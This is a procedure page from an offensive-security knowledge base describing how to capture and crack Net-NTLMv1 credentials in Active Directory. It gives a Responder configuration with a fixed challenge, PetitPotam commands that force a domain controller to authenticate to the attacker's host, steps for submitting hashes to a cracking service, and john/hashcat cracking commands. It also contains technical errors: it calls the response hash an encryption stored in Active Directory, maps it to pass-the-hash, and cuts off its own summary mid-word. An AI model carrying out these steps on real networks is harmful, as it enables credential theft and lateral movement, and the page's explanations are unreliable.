---
id: 6283aafc-2ae4-4a15-b77c-77aaa400c46d
name: Net-NTLMv1/NTLMv1 Hash Capture and Crack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.197722+00:00'
updated_at: '2023-04-10T20:35:59.601430+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Brute Force|T1110 - Brute Force]]'
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Pass the Hash|T1075 - Pass the Hash]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Capturing and cracking Net-NTLMv1/NTLMv1 hashes]]'
commands:
- '[[Hashcat bruteforce attack]]'
- '[[John netntlm format conversion]]'
- '[[PetitPotam.exe exploitation]]'
- '[[PetitPotam.py exploitation]]'
- '[[Set HTTPS, DNS, and LDAP]]'
---

# Net-NTLMv1/NTLMv1 Hash Capture and Crack

## Summary

The Net-NTLMv1/NTLMv1 Hash Capture and Crack procedure involves using various tools and techniques to capture and crack Net-NTLMv1/NTLMv1 hashes from a target's Active Directory environment. These hashes can then be used to gain access to other systems within the target's network. This type of atta

## Description

# Description

The Net-NTLMv1/NTLMv1 Hash Capture and Crack procedure involves using various tools and techniques to capture and crack Net-NTLMv1/NTLMv1 hashes from a target's Active Directory environment. These hashes can then be used to gain access to other systems within the target's network. This type of attack is commonly used by attackers to escalate privileges and gain access to sensitive information.

Technical Explanation: When a user logs into a Windows domain, their password is hashed and stored in the Active Directory database. The Net-NTLMv1/NTLMv1 hash is a one-way function that is used to encrypt the user's password. Attackers can use various tools and techniques to capture these hashes as they are transmitted over the network. Once the hashes are captured, they can be cracked using brute force or other methods to reveal the user's password.

Business Value: This procedure allows attackers to gain access to sensitive information and escalate privileges within a target's network. This can result in data theft, financial loss, and damage to the target's reputation.

 

## Requirements

1. Access to the target's Active Directory environment

1. Tools such as Responder and Hashcat

 

## Defense

1. Use strong passwords and implement multi-factor authentication to make it harder for attackers to capture and crack hashes

1. Monitor network traffic for signs of hash capture and other suspicious activity

1. Disable Net-NTLMv1/NTLMv1 authentication in favor of more secure protocols such as Kerberos

 

## Objectives

1. Capture Net-NTLMv1/NTLMv1 hashes from a target's Active Directory environment

1. Crack the captured hashes to reveal the user's password

1. Gain access to other systems within the target's network

 

# Instructions

1. To configure the Responder challenge, follow these steps:
1. Open the `/etc/responder/Responder.conf` file.
2. Locate the `Challenge` field.
3. Set the `Challenge` field to `1122334455667788`.
4. Save the file and close it.

 



**Code**: [[HTTPS = On
DNS = On
LDAP = On
...
; Custom challen]]



> The `Responder` tool is used for network analysis and penetration testing. It can be used to capture network traffic and perform various attacks. The `Challenge` field in the configuration file is used to specify a custom challenge for NTLM authentication. By setting it to `1122334455667788`, Responder will respond with this challenge to any NTLM authentication request it receives. This can be useful for capturing NTLM credentials and performing pass-the-hash attacks.



**Command** ([[Set HTTPS, DNS, and LDAP]]):

```bash
HTTPS = On
DNS = On
LDAP = On
...
; Custom challenge.
; Use "Random" for generating a random challenge for each requests (Default)
Challenge = 1122334455667788
```



2. To execute the PetitPotam attack, the attacker needs to run the PetitPotam.exe or PetitPotam.py script with the appropriate parameters. The attack can be carried out by providing the Responder-IP, DC-IP, username, password, and domain details. The command will then force a callback and attempt to authenticate the user, allowing the attacker to gain access to the target system.

 



**Code**: [[PetitPotam.exe Responder-IP DC-IP # Patched around]]



> The PetitPotam attack is a technique used by attackers to exploit the MS-EFSRPC (Encrypting File System Remote Protocol) functionality of Windows Active Directory Certificate Services (AD CS) to perform NTLM relay attacks. This attack can be used to escalate privileges and gain access to sensitive information on the target system. The attack is not patched for authenticated users and can be executed by running the PetitPotam.exe or PetitPotam.py script with the appropriate parameters.



**Command** ([[PetitPotam.exe exploitation]]):

```bash
PetitPotam.exe Responder-IP DC-IP # Patched around August 2021
```





**Command** ([[PetitPotam.py exploitation]]):

```bash
PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users
```



3. To format NTLMv1 hashes, follow these steps: 

1. Copy the hash string into a text editor
2. Replace the `username`, `hostname`, `response`, and `challenge` fields with the appropriate values
3. Separate the two hashes with `->` and add `NTHASH:` in front of each hash
4. Submit the formatted hashes to [crack.sh](https://crack.sh/netntlm/) for cracking

 



**Code**: [[username::hostname:response:response:challenge -> ]]



> NTLMv1 hashes are a type of password hash used in Windows authentication. They are vulnerable to various attacks and can be cracked to reveal the original password. However, before submitting the hashes to a cracking service like [crack.sh](https://crack.sh/netntlm/), they need to be formatted correctly. This command provides instructions on how to format NTLMv1 hashes for submission to a cracking service.

4. To crack NetNTLM hashes, use the following commands:
- john --format=netntlm hash.txt
- hashcat -m 5500 -a 3 hash.txt

 



**Code**: [[john --format=netntlm hash.txt
hashcat -m 5500 -a ]]



> The 'john' command is used to crack passwords by brute-forcing the hash. The '--format=netntlm' argument specifies the format of the hash to be cracked. The 'hash.txt' argument specifies the file containing the hashes.
The 'hashcat' command is also used to crack passwords by brute-forcing the hash. The '-m 5500' argument specifies the format of the hash to be cracked. The '-a 3' argument specifies the attack mode to be used. The 'hash.txt' argument specifies the file containing the hashes.



**Command** ([[John netntlm format conversion]]):

```bash
john --format=netntlm hash.txt
```





**Command** ([[Hashcat bruteforce attack]]):

```bash
hashcat -m 5500 -a 3 hash.txt
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Brute Force|T1110 - Brute Force]]
- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Pass the Hash|T1075 - Pass the Hash]]

## Commands Used

- [[Hashcat bruteforce attack]]
- [[John netntlm format conversion]]
- [[PetitPotam.exe exploitation]]
- [[PetitPotam.py exploitation]]
- [[Set HTTPS, DNS, and LDAP]]

## Tags

- [[Active Directory Attacks]]
- [[Capturing and cracking Net-NTLMv1/NTLMv1 hashes]]


